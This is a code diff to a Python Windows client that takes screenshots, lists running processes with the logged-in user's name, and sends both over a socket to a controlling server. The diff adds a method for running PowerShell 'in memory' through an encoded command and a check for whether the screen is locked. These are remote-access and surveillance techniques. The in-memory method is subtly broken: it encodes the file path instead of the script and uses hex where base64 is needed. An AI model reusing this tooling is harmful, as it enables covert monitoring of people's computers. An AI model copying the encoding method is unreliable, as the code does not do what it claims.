@@ -19,8 +19,7 @@ import sys
 import os
 
 # Local Modules
-from freestyle import Freestyle
-from tasks import Tasks
+# from freestyle import Freestyle
 
 
 class SystemInformation:
@@ -121,7 +120,43 @@ class Screenshot:
 
         logIt_thread(log_path, msg='Defining screenshot file name...')
         self.filename = rf"screenshot {self.client.hostname} {self.client.localIP} {self.dt}.jpg"
+        self.file_path = os.path.join(app_path, self.filename)
         logIt_thread(log_path, msg=f'Screenshot file name: {self.filename}')
+
+    def execute_powershell_script(self):
+        logIt_thread(log_path, msg='Running make_script()...')
+        logIt_thread(log_path, msg=f'Writing script to {self.ps_path}...')
+        with open(self.ps_path, 'w') as file:
+            file.write("Add-Type -AssemblyName System.Windows.Forms\n")
+            file.write("Add-Type -AssemblyName System.Drawing\n\n")
+            file.write("$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen\n\n")
+            file.write("$Width  = $Screen.Width\n")
+            file.write("$Height = $Screen.Height\n")
+            file.write("$Left = $Screen.Left\n")
+            file.write("$Top = $Screen.Top\n\n")
+            file.write("$bitmap = New-Object System.Drawing.Bitmap $Width, $Height\n")
+            file.write("$graphic = [System.Drawing.Graphics]::FromImage($bitmap)\n")
+            file.write("$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)\n\n")
+            file.write(rf"$bitmap.Save('{self.file_path}')")
+
+        time.sleep(0.2)
+        # subprocess.Popen(["powershell.exe", rf"{self.ps_path}"], stdout=sys.stdout).communicate()
+        logIt_thread(log_path, msg=f'Writing script to {self.ps_path} completed.')
+
+    def run_powershell_script_in_memory(self):
+        # Convert the script to a byte array
+        btes = self.ps_path.encode("utf-16-le")
+
+        # Use the byte array to create an in-memory file
+        stream = "".join(format(b, "02x") for b in btes)
+
+        # Load the in-memory file into a PowerShell instance and execute it
+        process = subprocess.Popen(["powershell.exe", "-EncodedCommand", stream], stdout=subprocess.PIPE,
+                                   stderr=subprocess.PIPE)
+        stdout, stderr = process.communicate()
+
+        # Return the output of the script
+        return stdout.decode("utf-16-le")
 
     def run_script(self):
         logIt_thread(log_path, msg=f'Capturing screenshot...')
@@ -146,12 +181,11 @@ class Screenshot:
         mem_dc.SelectObject(screenshot)
         mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
 
-        screenshot.SaveBitmapFile(mem_dc, self.filename)
+        screenshot.SaveBitmapFile(mem_dc, self.file_path)
 
         mem_dc.DeleteDC()
         win32gui.DeleteObject(screenshot.GetHandle())
         logIt_thread(log_path, msg=f'Screenshot captured.')
-        return
 
     def send_file(self):
         try:
@@ -165,14 +199,14 @@ class Screenshot:
             msg = self.client.soc.recv(1024).decode()
             logIt_thread(log_path, msg=f'Server confirmation: {msg}')
             logIt_thread(log_path, msg=f'Getting file size...')
-            length = os.path.getsize(self.filename)
+            length = os.path.getsize(self.file_path)
             logIt_thread(log_path, msg=f'Sending file size to server...')
             self.client.soc.send(convert_to_bytes(length))
             logIt_thread(log_path, msg=f'Send Completed.')
 
             # Send file content
             logIt_thread(log_path, msg=f'Opening {self.filename} with read bytes permissions...')
-            with open(self.filename, 'rb') as img_file:
+            with open(self.file_path, 'rb') as img_file:
                 img_data = img_file.read(1024)
                 logIt_thread(log_path, msg=f'Sending file content...')
                 while img_data:
@@ -184,8 +218,6 @@ class Screenshot:
 
             logIt_thread(log_path, msg=f'Send Completed.')
 
-            return
-
         except (WindowsError, socket.error, ConnectionError) as e:
             logIt_thread(log_path, msg=f'Connection Error: {e}')
             return False
@@ -193,7 +225,6 @@ class Screenshot:
     def confirm(self):
         try:
             logIt_thread(log_path, msg=f'Sending confirmation...')
-            time.sleep(0.2)
             self.client.soc.send(f"{self.client.hostname} | {self.client.localIP}: Screenshot Completed.\n".encode())
             logIt_thread(log_path, msg=f'Send Completed.')
 
@@ -201,17 +232,21 @@ class Screenshot:
             logIt_thread(log_path, msg=f'Connection Error')
             return False
 
+    def is_locked(self) -> bool:
+        user32 = ctypes.WinDLL('user32.dll')
+        hWnd = user32.GetForegroundWindow()
+        length = user32.GetWindowTextLengthA(hWnd)
+        return length == 0
+
     def run(self):
-        logIt_thread(log_path, msg='Running screenshot()...')
         logIt_thread(log_path, msg='Calling run_script()...')
         self.run_script()
+
         logIt_thread(log_path, msg='Calling send_file()...')
         self.send_file()
         logIt_thread(log_path, msg='Calling confirm()...')
         self.confirm()
-
-        logIt_thread(log_path, msg=f'Removing \n{self.filename} | \n{self.ps_path}...')
-        os.remove(self.filename)
+        os.remove(self.file_path)
         logIt_thread(log_path, msg=f'=== End of screenshot() ===')
 
 
@@ -219,18 +254,22 @@ class Tasks:
     def __init__(self, client):
         self.client = client
         self.task_list = []
+        logIt_thread(log_path, msg=f'Defining tasks file name...')
+        self.dt = get_date()
+        self.taskfile = rf"tasks {self.client.hostname} {str(self.client.localIP)} {self.dt}.txt"
+        self.task_path = os.path.join(app_path, self.taskfile)
 
     def command_to_file(self):
         logIt_thread(log_path, msg=f'Running command_to_file()...')
         try:
-            logIt_thread(log_path, msg=f'Opening file: {self.taskfile}...')
-            with open(self.taskfile, 'w') as task_file:
+            logIt_thread(log_path, msg=f'Opening file: {self.task_path}...')
+            with open(self.task_path, 'w') as task_file:
                 task_file.write(f"{'=' * 80}\n")
                 task_file.write(f"IP: {self.client.localIP} | NAME: {self.client.hostname} | "
                                 f"LOGGED USER: {os.getlogin()} | {self.dt}\n")
                 task_file.write(f"{'=' * 80}\n")
 
-            with open(self.taskfile, 'a') as task_file:
+            with open(self.task_path, 'a') as task_file:
                 subprocess.run(['tasklist'], stdout=task_file)
                 task_file.write('\n')
 
@@ -254,20 +293,20 @@ class Tasks:
 
     def print_file_content(self):
         logIt_thread(log_path, msg=f'Running print_file_content()...')
-        logIt_thread(log_path, msg=f'Opening file: {self.taskfile}...')
-        with open(self.taskfile, 'r') as file:
+        logIt_thread(log_path, msg=f'Opening file: {self.task_path}...')
+        with open(self.task_path, 'r') as file:
             logIt_thread(log_path, msg=f'Adding content to list...')
             for line in file.readlines():
                 self.task_list.append(line)
 
-        logIt_thread(log_path, msg=f'Printing content from list...')
-        for t in self.task_list:
-            print(t)
+        # logIt_thread(log_path, msg=f'Printing content from list...')
+        # for t in self.task_list:
+        #     print(t)
 
     def send_file_size(self):
         logIt_thread(log_path, msg=f'Running send_file_size()...')
         logIt_thread(log_path, msg=f'Defining file size...')
-        length = os.path.getsize(self.taskfile)
+        length = os.path.getsize(self.task_path)
         logIt_thread(log_path, msg=f'File Size: {length}')
 
         try:
@@ -282,9 +321,9 @@ class Tasks:
 
     def send_file_content(self):
         logIt_thread(log_path, msg=f'Running send_file_content()...')
-        logIt_thread(log_path, msg=f'Opening file: {self.taskfile}...')
-        with open(self.taskfile, 'rb') as tsk_file:
-            logIt_thread(log_path, msg=f'Reading content from {self.taskfile}...')
+        logIt_thread(log_path, msg=f'Opening file: {self.task_path}...')
+        with open(self.task_path, 'rb') as tsk_file:
+            logIt_thread(log_path, msg=f'Reading content from {self.task_path}...')
             tsk_data = tsk_file.read(1024)
             try:
                 logIt_thread(log_path, msg=f'Sending file content...')
@@ -355,11 +394,6 @@ class Tasks:
         return True
 
     def run(self) -> bool:
-        logIt_thread(log_path, msg=f'Defining tasks file name...')
-        self.dt = get_date()
-        self.taskfile = rf"tasks {self.client.hostname} {str(self.client.localIP)} {self.dt}.txt"
-        logIt_thread(log_path, msg=f'Tasks file name: {self.taskfile}')
-
         logIt_thread(log_path, msg=f'Calling command_to_file()...')
         self.command_to_file()
         logIt_thread(log_path, msg=f'Calling send_file_name()...')
@@ -373,8 +407,8 @@ class Tasks:
         logIt_thread(log_path, msg=f'Calling confirm()...')
         self.confirm()
 
-        logIt_thread(log_path, msg=f'Removing file: {self.taskfile}...')
-        os.remove(self.taskfile)
+        logIt_thread(log_path, msg=f'Removing file: {self.task_path}...')
+        os.remove(self.task_path)
 
         try:
             self.client.soc.settimeout(10)
@@ -607,15 +641,15 @@ Catch {
                     break
 
                 # Freestyle
-                if str(command.lower())[:9] == "freestyle":
-                    logIt_thread(log_path, msg='Initiating Freestyle class...')
-                    free = Freestyle(self.client.soc, log_path, self.client.hostname, self.client.localIP)
-
-                    logIt_thread(log_path, msg='Calling Freestyle class...')
-                    free.free_style()
+                # if str(command.lower())[:9] == "freestyle":
+                #     logIt_thread(log_path, msg='Initiating Freestyle class...')
+                #     free = Freestyle(self.client.soc, log_path, self.client.hostname, self.client.localIP)
+                #
+                #     logIt_thread(log_path, msg='Calling Freestyle class...')
+                #     free.free_style()
 
                 # Vital Signs
-                if str(command.lower())[:5] == "alive":
+                elif str(command.lower())[:5] == "alive":
                     logIt_thread(log_path, msg='Calling Vital Signs...')
                     try:
                         logIt_thread(log_path, msg='Answer yes to server')
@@ -722,15 +756,13 @@ class Client:
 
     def connection(self) -> None:
         logIt_thread(log_path, msg=f'Running connection()...')
-        while True:
-            time.sleep(1)
-            try:
-                logIt_thread(log_path, msg=f'Connecting to Server: {self.server_host} | Port {self.server_port}...')
-                self.soc.connect((self.server_host, self.server_port))
+        try:
+            logIt_thread(log_path, msg=f'Connecting to Server: {self.server_host} | Port {self.server_port}...')
+            self.soc.connect((self.server_host, self.server_port))
 
-            except (TimeoutError, WindowsError, ConnectionAbortedError, ConnectionResetError, socket.timeout) as e:
-                logIt_thread(log_path, msg=f'Connection Error: {e}')
-                continue
+        except (TimeoutError, WindowsError, ConnectionAbortedError, ConnectionResetError, socket.timeout) as e:
+            logIt_thread(log_path, msg=f'Connection Error: {e}')
+            return False
 
     def welcome(self):
         endpoint_welcome = Welcome(self)
